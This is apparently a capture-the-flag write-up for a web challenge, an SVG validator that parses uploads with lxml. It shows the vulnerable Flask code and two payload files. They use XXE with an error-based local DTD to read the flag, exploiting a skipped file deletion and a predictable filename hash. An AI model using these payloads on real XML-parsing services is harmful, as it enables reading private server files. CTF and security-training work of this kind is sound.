---
id: 17948583-e65d-8037-bf0f-d573b2499823
title: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
created_time: 2025-01-12T10:59:00.000Z
last_edited_time: 2025-05-22T09:16:00.000Z
cover_image: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif
icon_emoji: 🫡
categories:
  - XXE
verification:
  state: unverified
  verified_by: null
  date: null
page: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif

---

# Description

A simple SVG validator.

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/8d6a70b2-6c3c-410a-9ddb-5303e731a08d/svg-validator.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466ZQKJ4RTO%2F20250524%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250524T044816Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEUaCXVzLXdlc3QtMiJGMEQCIAxM8ejl%2BRE8DJwIzi7jHgahXAdvHjgOR0yCagDSPM%2FqAiB%2FRi7Z%2Bk3UI6yhCJ9KkvEN2APhU09n4pZa1JJNQ%2BONASqIBAj%2B%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMFf6KuYzA%2BGo4FCalKtwDIKA3NRa7SU4ppXmyTLpjTA5QBfNisPetQ4FOwG7hfvI5K72UpRkcOPqV8%2BFeW08d%2B1hN%2FyXHuvGdjjU1%2B%2F8%2Be9Kw%2B1GFwdPwv9L7KbUqPuyZAqapE0rCch1T8lFV1h8x4rGhq2jLoaIEXQvRaXapesV6%2BEZxWMbOcVU8fq6z9KZP0%2FN6P%2FBXKYH8w2WgTbKjftPVx4vt4CqZ76DaM1O24nuoRVpQPMj1DNiaSEJ0kDOS8wBv5wRqJJNbUB5LJ3x0NAr6JxVH%2Fy58vOXEvMh28hiPdqvbHuezK3QS53jNS61l7w%2FwbsdC3iYLAjZVOBB%2BxX2c2FhHjxkjazv1oocZGT7zGa%2FC2OkzFAZSAwVD5ouiZ7KObJKhhZOHSN4Y8SGeepNs869%2BXTEeIiNry%2B7%2Fl30tNlFzUqcweLaEkkkmhMjooNRaPnkgIBCMDBC0Vif%2FBuUUEQE0Qy%2BuQN%2B7R%2FAdGI566ZD3aa0ZFTI%2BTo4tcTfs6Z6evSwFGQ%2Btp%2FDclGjMdeUUspGgHrcFwLVBIR1VIBCfeWFvOJ2mgMq63tR7BUeAzw%2B2dXPnHWF%2BxBDRLp9aUXcdkejrXwIVPYRkC%2FVKd52fO%2Bd2ppneMm28WR8M1o5OvoMM3knlfYoaLGQw%2BZLFwQY6pgHNIrlZKQE3xf4nTwH9873NYy9TAVGalkBLnA1TF8xAm9ZTB5Acu%2BQyvC35jGJMBD8AxkWOti%2BcEnEROUfqDgfqrFIV1vNasgkLOuyQzPPBMXSMSg%2FHqXtBByk6dHKpiwNEuYxos8gj4D8%2F4vcR00d4azyxEnKFrRftIXS2o3wp3J3SBfbZz77wivMjGMP9TQtkuSbJJj1tFtE9%2FODD4TiFfSJvm87N\&X-Amz-Signature=9dc84985c27a2d3ee68485d4ec69efcdade04eb5a5e1052be11c186bfa9c2339\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# Exploit

In order to gain Arbitrary File Read, we will exploit the XXE vulnerability in the `lxml.etree`. We must introduce an error in the XML since we cannot read the flag information directly because we do not receive the rendered XML's direct output.

For this task, we have to save our local file on the server, but we can't because it will be deleted after validation. However, we can store and get around the `os.remove` due of a logical error:

```python
        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

Therefore, by making the `is_valid_svg` function throw an error, we can avoid the `os.remove` step and ensure that the file stored on the server will remain intact even if our `is_valid_svg` method gives an error.

```python
def is_valid_svg(file_path):
    tree = etree.parse(file_path)
    root = tree.getroot()
    return root.tag.endswith('svg')

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400

    file = request.files['file']

    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400

    if not allowed_file(file.filename):
        return jsonify({'error': 'Invalid file extension'}), 400

    file_path = ''

    try:
        extension = file.filename.rsplit('.', 1)[1].lower()

        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)

        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

We now need to keep one XML file on the server so that we can add it later to cause an error that will leak the flag. This is the first file we upload:

testing.svg

```python
<!ENTITY % content SYSTEM "file://app/flag.txt">
	<!ENTITY % test '<!ENTITY &#x25; file SYSTEM "file:///tmp/%content;">'>
 	%test;
```

due to the etree.Parse will automatically avoid the os.remove function and throw an error since it does not recognize this as valid XML. The second file is as follows:

file.svg

```python
<!DOCTYPE root [
	<!ENTITY % dtd SYSTEM "file:///tmp/051880fbfbd0b3f38ec3244610784c3a9c258f755039bb7cf1311fd1fc843f2d.svg">
 	%dtd;
]>
<svg></svg>
```

The file in tmp is a file that we upload before, the hash isn’t random and same each iteration because their filename isn’t use secret.token\_hex function properly:

```python
        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
```

So after we uploaded that two file we will get the flag:

![](./imgs/image_UQYv5eO4.png)
